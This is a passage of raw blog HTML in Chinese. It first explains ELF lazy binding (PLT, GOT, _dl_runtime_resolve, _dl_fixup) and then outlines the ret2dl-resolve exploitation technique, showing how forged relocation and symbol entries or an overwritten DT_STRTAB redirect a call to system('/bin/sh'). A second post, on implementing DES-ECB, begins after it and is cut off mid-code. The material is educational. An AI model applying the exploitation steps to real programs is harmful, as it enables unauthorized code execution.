class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>i <span class="number">0xf7fee000</span></span><br><span class="line">   <span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;:push   eax</span><br><span class="line">   <span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;:push   ecx</span><br><span class="line">   <span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;:push   edx</span><br><span class="line">   <span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;:mov    edx,DWORD PTR [esp+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0xf7fee007</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;:mov    eax,DWORD PTR [esp+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0xf7fee00b</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;:call   <span class="number">0xf7fe77e0</span> &lt;_dl_fixup&gt;</span><br><span class="line">   <span class="number">0xf7fee010</span> &lt;_dl_runtime_resolve+<span class="number">16</span>&gt;:pop    edx</span><br><span class="line">   <span class="number">0xf7fee011</span> &lt;_dl_runtime_resolve+<span class="number">17</span>&gt;:mov    ecx,DWORD PTR [esp]</span><br><span class="line">   <span class="number">0xf7fee014</span> &lt;_dl_runtime_resolve+<span class="number">20</span>&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   <span class="number">0xf7fee017</span> &lt;_dl_runtime_resolve+<span class="number">23</span>&gt;:mov    eax,DWORD PTR [esp+<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0xf7fee01b</span> &lt;_dl_runtime_resolve+<span class="number">27</span>&gt;:ret    <span class="number">0xc</span></span><br><span class="line">   <span class="number">0xf7fee01e</span>:xchg   ax,ax</span><br><span class="line">   <span class="number">0xf7fee020</span> &lt;_dl_runtime_profile&gt;:push   esp</span><br><span class="line">   <span class="number">0xf7fee021</span> &lt;_dl_runtime_profile+<span class="number">1</span>&gt;:add    DWORD PTR [esp],<span class="number">0x8</span></span><br><span class="line">   <span class="number">0xf7fee025</span> &lt;_dl_runtime_profile+<span class="number">5</span>&gt;:push   ebp</span><br><span class="line">   <span class="number">0xf7fee026</span> &lt;_dl_runtime_profile+<span class="number">6</span>&gt;:push   eax</span><br><span class="line">   <span class="number">0xf7fee027</span> &lt;_dl_runtime_profile+<span class="number">7</span>&gt;:push   ecx</span><br><span class="line">   <span class="number">0xf7fee028</span> &lt;_dl_runtime_profile+<span class="number">8</span>&gt;:push   edx</span><br><span class="line">   <span class="number">0xf7fee029</span> &lt;_dl_runtime_profile+<span class="number">9</span>&gt;:mov    ecx,esp</span><br><span class="line">   <span class="number">0xf7fee02b</span> &lt;_dl_runtime_profile+<span class="number">11</span>&gt;:sub    esp,<span class="number">0x8</span></span><br></pre></td></tr></table></figure><p>在<strong>0xf7fee00b</strong>地址处调用了 <strong>_dl_fixup()</strong>函数，并且采用寄存器传参，<strong>dl_fixup()</strong>是在<strong>dl-runtime.c</strong>中实现的， <strong>_dl_fixup</strong>函数传入的两个参数一个是<strong>rdi</strong>寄存器中存储的<strong>link_map</strong>，<strong>rsi</strong>是<strong>GOT</strong>表中关于<strong>PLT</strong>重定位的索引值，后面要根据该索引值写入新的地址 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">｛</span><br><span class="line">    const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);</span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);</span><br><span class="line">    return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">｝</span><br></pre></td></tr></table></figure><p>逐行解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure><p>这里面 <strong>link_map</strong>还是一开始传进来的<strong>link_map</strong>,但一开始传进来的<strong>rel_offset</strong>改为用<strong>reloc_arg</strong>表示：<code>reloc_arg=reloffset</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure><p>用来计算重定位入口<strong>reloc</strong>，<strong>JMPREL</strong>即<strong>.rel.plt</strong>地址，<strong>reloc_offset</strong>即<strong>reloc_arg</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure><p>找到在.<strong>dynsym</strong>中对应的条目，<strong>[ELFW(R_SYM) (reloc-&gt;r_info)]</strong>就是为了找到对应的<strong>num[?]</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure><p>检查<strong>reloc-&gt;r_info</strong>的最低位是不是<strong>R_386_JUMP_SLOT=7</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);</span><br></pre></td></tr></table></figure><p>根据<strong>st_name</strong>对应的偏移，去<strong>.dynstr(STRTAB)</strong>中查找对应的字符串，<strong>result</strong>为<strong>libc</strong>基地址(不知道是怎么找到<strong>result</strong>的，反正知道就好了。。。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);</span><br></pre></td></tr></table></figure><p><strong>value</strong>为函数的实际地址，在<strong>libc</strong>基地址的基础上加上函数在<strong>libc</strong>中的偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure><p>将函数地址写到<strong>got</strong>表对应位置</p><p>简单来说_dl_runtime_resolve就是会</p><ol><li>用<strong>link_map</strong>访问.<strong>dynamic</strong>，取出.<strong>dynstr</strong>, .<strong>dynsym</strong>, <strong>.rel.plt</strong>的指针</li><li><strong>.rel.plt + 第二个参数</strong>求出当前函数的重定位表项<strong>Elf32_Rel</strong>的指针，记作<strong>rel</strong></li><li><strong>rel-&gt;r_info &gt;&gt; 8</strong>作为.<strong>dynsym</strong>的下标，求出当前函数的符号表项<strong>Elf32_Sym</strong>的指针，记作<strong>sym</strong></li><li><strong>.dynstr + sym-&gt;st_name</strong>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<strong>*rel-&gt;r_offset</strong>，即<strong>GOT</strong>表</li><li>调用这个函数</li></ol><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/image003.jpg" alt></p><blockquote><h5 id="从一个ELF动态链接库文件中，根据已知的函数名称，找到相应的函数起始地址，那么过程是这样的，先从前面的ELF-的ehdr中找到文件的偏移e-phoff处，在这其中找到为PT-DYNAMIC-的d-tag的phdr，从这个地址开始处找到DT-DYNAMIC的节，最后从其中找到这样一个Elf32-Sym结构，它的st-name所指的字符串与给定的名称相符，就用st-value便是了"><a href="#从一个ELF动态链接库文件中，根据已知的函数名称，找到相应的函数起始地址，那么过程是这样的，先从前面的ELF-的ehdr中找到文件的偏移e-phoff处，在这其中找到为PT-DYNAMIC-的d-tag的phdr，从这个地址开始处找到DT-DYNAMIC的节，最后从其中找到这样一个Elf32-Sym结构，它的st-name所指的字符串与给定的名称相符，就用st-value便是了" class="headerlink" title="从一个ELF动态链接库文件中，根据已知的函数名称，找到相应的函数起始地址，那么过程是这样的，先从前面的ELF 的ehdr中找到文件的偏移e_phoff处，在这其中找到为PT_DYNAMIC  的d_tag的phdr，从这个地址开始处找到DT_DYNAMIC的节，最后从其中找到这样一个Elf32_Sym结构，它的st_name所指的字符串与给定的名称相符，就用st_value便是了"></a>从一个ELF动态链接库文件中，根据已知的函数名称，找到相应的函数起始地址，那么过程是这样的，先从前面的ELF 的ehdr中找到文件的偏移e_phoff处，在这其中找到为PT_DYNAMIC  的d_tag的phdr，从这个地址开始处找到DT_DYNAMIC的节，最后从其中找到这样一个Elf32_Sym结构，它的st_name所指的字符串与给定的名称相符，就用st_value便是了</h5></blockquote><h1 id="深入理解"><a href="#深入理解" class="headerlink" title="深入理解"></a>深入理解</h1><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">  <span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;     push   ecx</span><br><span class="line">  <span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;     push   edx</span><br><span class="line">  <span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;     mov    edx, dword ptr [esp + <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0xf7fee007</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;     mov    eax, dword ptr [esp + <span class="number">0xc</span>]</span><br><span class="line">► <span class="number">0xf7fee00b</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;    call   _dl_fixup &lt;<span class="number">0xf7fe77e0</span>&gt;</span><br><span class="line">       arg[<span class="number">0</span>]: <span class="number">0xffffd094</span> ◂— <span class="number">0x0</span></span><br><span class="line">       arg[<span class="number">1</span>]: <span class="number">0xffffd070</span> ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure><p>调用函数过程中已经压入了两个参数：第一个是动态链接库的<strong>struct link_map*</strong> 指针，另一个是<strong>rel</strong>的索引值， 这里是给下面的fixup函数以寄存器传递参数 </p><p>真正的解析在<strong>do_lookup</strong>中实现了，我这里还是它的实现伪代码:</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Elf32_Addr  <span class="title">do_lookup</span><span class="params">(struct link_map* lmap,<span class="keyword">char</span>* symname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>* <span class="title">search_lmap</span>=<span class="title">NULL</span>;</span></span><br><span class="line">Elf32_Sym* symtab;</span><br><span class="line">Elf32_Sym* sym;</span><br><span class="line"><span class="keyword">char</span>* strtab;</span><br><span class="line"><span class="keyword">char</span>* find_name;</span><br><span class="line"><span class="keyword">int</span> symindx;   </span><br><span class="line">Elf32_Word hash=elf_hash_name(symname);</span><br><span class="line">for_each_search_lmap_in_search_list(lmap,search_lmap)</span><br><span class="line">&#123;</span><br><span class="line">symtab=search_lmap-&gt;l_info[DT_SYMTAB].d_un.d_ptr;</span><br><span class="line">strtab=search_lmap-&gt;l_info[DT_STRTAB].d_un.d_ptr;</span><br><span class="line"><span class="keyword">for</span> (symindx=search_lmap-&gt;l_buckets[hash % search_lmap-&gt;l_nbuckets];</span><br><span class="line">symindx!=<span class="number">0</span>;symindx=search_lmap-&gt;l_chain[symindx])</span><br><span class="line">&#123;</span><br><span class="line">sym=&amp;symtab[symindx];</span><br><span class="line">find_name=strtab+sym-&gt;st_name;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(find_name,symname)==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> sym-&gt;st_value+search_lmap-&gt;l_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/image004.jpg" alt></p><h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p>函数第一次被调用过程</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%96%B0%E6%89%8B%E5%90%91%E2%80%94%E2%80%94%E6%B5%85%E8%B0%88PLT%E5%92%8CGOT/5970003-bcf9343191848103.png" alt="img"></p><p>第一步由函数调用跳入到<strong>PLT</strong>表中，然后第二步<strong>PLT</strong>表跳到<strong>GOT</strong>表中，可以看到第三步由<strong>GOT</strong>表回跳到<strong>PLT</strong>表中，这时候进行压栈，把代表函数的<strong>ID</strong>压栈，接着第四步跳转到公共的<strong>PLT</strong>表项中，第5步进入到<strong>GOT</strong>表中，然后<strong>_dl_runtime_resolve</strong>对动态函数进行地址解析和重定位，第七步把动态函数真实的地址写入到<strong>GOT</strong>表项中，然后执行函数并返回。</p><p>函数之后被调用过程</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%96%B0%E6%89%8B%E5%90%91%E2%80%94%E2%80%94%E6%B5%85%E8%B0%88PLT%E5%92%8CGOT/5970003-9baedd55881a39dd.png" alt="img"></p><p>可以看到，第一步还是由函数调用跳入到<strong>PLT</strong>表，但是第二步跳入到<strong>GOT</strong>表中时，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回。</p><p>对于动态函数的调用，第一次要经过地址解析和回写到<strong>GOT</strong>表项中，第二次直接调用即可</p><h1 id="ret2dl-resolve-利用"><a href="#ret2dl-resolve-利用" class="headerlink" title="ret2dl-resolve 利用"></a>ret2dl-resolve 利用</h1><p>主要是看 <strong>.dynamic</strong>能否可写 </p><h2 id="改写-dynamic的DT-STRTAB"><a href="#改写-dynamic的DT-STRTAB" class="headerlink" title="改写.dynamic的DT_STRTAB"></a>改写.dynamic的DT_STRTAB</h2><p>这个只有在<strong>checksec</strong>时<strong>No RELRO</strong>可行，即<strong>.dynamic</strong>可写。因为<strong>ret2dl-resolve</strong>会从<strong>.dynamic</strong>里面拿.<strong>dynstr</strong>字符串表的指针，然后加上<strong>offset</strong>取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够<strong>改写</strong>这个指针到一块我们能够操纵的内存空间，当<strong>resolve</strong>的时候，就能<strong>resolve</strong>成我们所指定的任意库函数。比方说，原本是一个<strong>free</strong>函数，我们就把原本是<strong>free</strong>字符串的那个偏移位置设为<strong>system</strong>字符串，<strong>第一次</strong>调用<code>free(&quot;bin/sh&quot;)</code>（因为只有第一次才会resolve），就等于调用了<code>system(&quot;/bin/sh&quot;)</code></p><h2 id="操纵第二个参数，使其指向我们所构造的Elf32-Rel"><a href="#操纵第二个参数，使其指向我们所构造的Elf32-Rel" class="headerlink" title="操纵第二个参数，使其指向我们所构造的Elf32_Rel"></a>操纵第二个参数，使其指向我们所构造的Elf32_Rel</h2><p>如果<code>.dynamic</code>不可写，那么以上方法就没用了，所以有第二种利用方法。要知道，前面的<code>_dl_runtime_resolve</code>在第二步时</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; .rel.plt + 第二个参数`求出当前函数的重定位表项`Elf32_Rel`的指针，记作`rel</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>这个时候，<code>_dl_runtime_resolve</code>并没有检查<code>.rel.plt + 第二个参数</code>后是否造成越界访问，所以我们能给一个很大的<code>.rel.plt</code>的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说<code>.bss</code>。</p><p>然后第三步</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; rel-&gt;r_info &gt;&gt; 8`作为`.dynsym`的下标，求出当前函数的符号表项`Elf32_Sym`的指针，记作`sym</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p> 所以在我们所伪造的<code>Elf32_Rel</code>，需要放一个<code>r_info</code>字段，大概长这样就行<code>0xXXXXXX07</code>，其中XXXXXX是相对<code>.dynsym</code>表的下标，注意不是偏移，所以是偏移除以<code>Elf32_Sym</code>的大小，即除以<code>0x10</code>（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个<code>Elf32_Sym</code>。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。</p><p>然后第四步</p><blockquote><p><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</p></blockquote><p>同样类似，没有进行越界访问检查，所以这个字符串也能够伪造。</p><p>所以，最终的利用思路，大概是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80482d0</span>push dword ptr [<span class="number">0x804a004</span>]</span><br><span class="line"><span class="number">0x80482d6</span>jmp  dword ptr [<span class="number">0x804a008</span>]</span><br></pre></td></tr></table></figure><p>构造ROP，跳转到resolve的PLT，<code>push link_map</code>的位置，就是上图所示的这个地方。此时，栈中必须要有已经伪造好的指向伪造的<code>Elf32_Rel</code>的偏移，然后是返回地址（<code>system</code>的话无所谓），再然后是参数（如果是<code>system</code>函数的话就要是指向<code>&quot;/bin/sh\x00&quot;</code>的指针）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DES-ECB</title>
      <link href="/2019/10/12/DES-ECB/"/>
      <url>/2019/10/12/DES-ECB/</url>
      
        <content type="html"><![CDATA[<h2 id="软件系统设计"><a href="#软件系统设计" class="headerlink" title="软件系统设计"></a>软件系统设计</h2><h3 id="实现Feistel密码结构（64bit分组长度）"><a href="#实现Feistel密码结构（64bit分组长度）" class="headerlink" title="实现Feistel密码结构（64bit分组长度）"></a>实现Feistel密码结构（64bit分组长度）</h3><p>单独通过一个Feistel函数抽象了Feistel结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Feistel</span><span class="params">(ClearTxt,Key,Model)</span>:</span></span><br><span class="line">    <span class="comment">#Step 1 is CreateKey</span></span><br><span class="line">    keylist = createkey(Key)</span><br><span class="line">    print()</span><br><span class="line">    <span class="keyword">if</span> Model == <span class="number">1</span>:</span><br><span class="line">        keylist = keylist</span><br><span class="line">    <span class="keyword">if</span> Model == <span class="number">2</span>:</span><br><span class="line">        keylist = keylist[::<span class="number">-1</span>] <span class="comment">#INVERSEKEY</span></span><br><span class="line">    <span class="comment">#Step 2 is ClearTxt</span></span><br><span class="line">    text = DES_ECB(ClearTxt,keylist)</span><br><span class="line">    <span class="keyword">return</span>  text</span><br></pre></td></tr></table></figure><p>通过不同的加密轮函数和密钥生成结构就可以组合成不同的Feistel密码，通过不同的Key生成函数可以生成不同的子密钥数组</p><h3 id="DES算法实现"><a href="#DES算法实现" class="headerlink" title="DES算法实现"></a>DES算法实现</h3><h4 id="初始置换实现"><a href="#初始置换实现" class="headerlink" title="初始置换实现"></a>初始置换实现</h4><p>Java实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] IP(<span class="keyword">int</span>[] BinaryClearTxt)&#123;</span><br><span class="line">        <span class="keyword">int</span>[] IPTABLE = &#123;<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">                <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">                <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">                <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">                <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">                <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">                <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>&#125;;</span><br><span class="line">        <span class="keyword">if</span>(BinaryClearTxt.length != <span class="number">64</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your key Text lenth is Error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; IPTABLE.length;i++)&#123;</span><br><span class="line">                ret[i] = BinaryClearTxt[IPTABLE[i]-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(<span class="string">"Source ClearText : "</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;BinaryClearTxt.length;i++)&#123;</span><br><span class="line">                System.out.print(BinaryClearTxt[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IP</span><span class="params">(ClearTxt)</span>:</span></span><br><span class="line">    IPTABLE = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">                 <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">                 <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">                 <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">                 <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">                 <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">                 <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">                 <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line">    <span class="keyword">if</span> len(ClearTxt) != <span class="number">64</span>:</span><br><span class="line">        print(<span class="string">"Your key Text lenth is Error!"</span>)</span><br><span class="line">        <span class="keyword">assert</span> len(ClearTxt) == <span class="number">64</span>  <span class="comment"># if no 64bit error</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> IPTABLE:</span><br><span class="line">            ret = ret + ClearTxt[i - <span class="number">1</span>]</span><br><span class="line">        print(<span class="string">"Source ClearText : "</span>,ClearTxt)</span><br><span class="line">        print(<span class="string">"IP Replace : "</span>,ret)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure><h4 id="子密钥生成实现"><a href="#子密钥生成实现" class="headerlink" title="子密钥生成实现"></a>子密钥生成实现</h4><p>Java实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span 